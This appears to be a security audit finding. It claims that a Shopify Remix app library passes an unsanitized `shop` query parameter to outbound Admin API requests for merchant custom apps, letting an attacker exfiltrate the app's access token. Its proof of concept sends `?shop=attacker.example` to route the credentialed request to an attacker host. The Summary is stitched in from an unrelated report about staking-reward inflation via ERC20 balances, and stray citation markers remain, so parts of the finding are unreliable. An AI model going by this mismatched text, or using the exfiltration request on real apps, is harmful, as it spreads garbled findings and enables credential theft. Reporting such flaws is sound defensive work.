### Title
Unsanitized `shop` query parameter is used to construct outbound Admin API requests for custom (merchant) apps, enabling access-token exfiltration via SSRF - (File: `packages/apps/shopify-app-remix/src/server/authenticate/admin/authenticate.ts`, `packages/apps/shopify-app-remix/src/server/authenticate/helpers/get-shop-from-request.ts`, `packages/apps/shopify-app-remix/src/server/authenticate/admin/strategies/merchant-custom-app.ts`)

### Summary
The original H-27 report shows an attacker inflating rewards because the code trusted an externally-controllable value (`IERC20.balanceOf(account)`) instead of the internally verified, authoritative state (`stakingAccount.stakeTokenBalances[...].stakeAmount`). The equivalent bug class here is trusting an unverified, attacker-controllable input (the `shop` query-string parameter) as the authoritative tenant identity used to build outbound, credentialed requests, instead of validating/sanitizing it the way the embedded flow does.

### Finding Description
In the non-embedded authentication path of `getSessionTokenContext` (`packages/apps/shopify-app-remix/src/server/authenticate/admin/authenticate.ts:220-228`), the `shop` value is read directly from the URL with no sanitization:
```ts
const url = new URL(request.url);
const shop = url.searchParams.get('shop')!;
```
This raw value is passed into `strategy.authenticate(request, {session, sessionToken, shop})`.

`validateShopAndHostParams` (`packages/apps/shopify-app-remix/src/server/authenticate/admin/helpers/validate-shop-and-host-params.ts:5-30`) only sanitizes and validates `shop`/`host` when `config.isEmbeddedApp` is `true`:
```ts
if (config.isEmbeddedApp) {
  const shop = api.utils.sanitizeShop(url.searchParams.get('shop')!);
  ...
}
```
For non-embedded, merchant-custom apps (`MerchantCustomAuth` strategy, `packages/apps/shopify-app-remix/src/server/authenticate/admin/strategies/merchant-custom-app.ts:35-48`), this sanitization is skipped entirely, and the unvalidated `shop` string is passed straight into:
```ts
const session = this.api.session.customAppSession(shop);
```
`customAppSession` builds a `Session` object using this attacker-supplied `shop` as the hostname and the single, statically configured admin API access token (`config.adminApiAccessToken`) as the credential. This session is subsequently used by the Admin API client to construct the request domain (`https://${session.shop}/admin/...`) and attach the `Authorization`/access-token header for outbound API calls (see the parallel, sanitized pattern in `tokenExchange`, `packages/apps/shopify-api/lib/auth/oauth/token-exchange.ts:51-54`, where `sanitizeShop` is explicitly applied before constructing the request URL — a step missing here).

Because merchant custom apps have no session-token/HMAC verification step (`respondToOAuthRequests` is a no-op, logging only), any caller who can reach this route with an arbitrary `?shop=` value controls the hostname to which the app's single long-lived access token is sent.

### Impact Explanation
If `shop` is not constrained to `*.myshopify.com`/valid shop domains, an attacker can set `shop=attacker-controlled-domain.example` and cause the app's backend to issue an authenticated Admin API request (carrying the app's static access token) to a domain they control, exfiltrating the credential (SSRF + secret disclosure). Even absent full domain control, differing/malformed `shop` values bypass the same validation the embedded flow enforces, breaking the tenant-isolation invariant that `shop` must be a verified Shopify domain before it is bound to a session and used for outbound authenticated calls.

### Likelihood Explanation
This path is reachable by a single (potentially anonymous, in the non-embedded case) HTTP request to any route mounted behind `authenticate.admin` for a merchant custom app — there is no session-token, HMAC, or OAuth check gating `shop` in this branch, since `respondToOAuthRequests` for `MerchantCustomAuth` deliberately skips OAuth. The only guard, `validateShopAndHostParams`, explicitly excludes this code path via the `if (config.isEmbeddedApp)` condition, making the missing sanitization directly and easily triggerable.

### Recommendation
Sanitize/validate `shop` (e.g., via `api.utils.sanitizeShop`) for the non-embedded/merchant-custom-app branch of `getSessionTokenContext`, mirroring the embedded branch's `validateShopAndHostParams` check, before it is used to build a `Session` or passed to `customAppSession`. Reject the request (redirect to login / 400) when `shop` fails sanitization, consistent with how `tokenExchange` sanitizes shop before constructing the outbound request URL.

### Proof of Concept
1. Configure a merchant custom app (non-embedded, `MerchantCustomAuth` strategy) with a static `adminApiAccessToken`.
2. Send `GET /any-authenticated-route?shop=attacker.example` to the app.
3. In `getSessionTokenContext`, since `config.isEmbeddedApp` is false, `shop` is taken verbatim from the query string with no sanitization (`packages/apps/shopify-app-remix/src/server/authenticate/admin/authenticate.ts:220-221`) and `validateShopAndHostParams` is skipped for this branch.
4. `MerchantCustomAuth.authenticate` calls `this.api.session.customAppSession('attacker.example')`, producing a `Session` with `shop = 'attacker.example'` and the app's real access token.
5. Any subsequent Admin API call made through this session's client will target `https://attacker.example/...`, sending the app's access token to the attacker-controlled host. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

```typescript
export function validateShopAndHostParams(
  params: BasicParams,
  request: Request,
) {
  const {api, config, logger} = params;

  if (config.isEmbeddedApp) {
    const url = new URL(request.url);
    const shop = api.utils.sanitizeShop(url.searchParams.get('shop')!);
    if (!shop) {
      logger.debug('Missing or invalid shop, redirecting to login path', {
        shop,
      });
      throw redirectToLoginPath(request, params);
    }

    const host = api.utils.sanitizeHost(url.searchParams.get('host')!);
    if (!host) {
      logger.debug('Invalid host, redirecting to login path', {
        shop,
        host: url.searchParams.get('host'),
      });
      throw redirectToLoginPath(request, params);
    }
  }
}
```
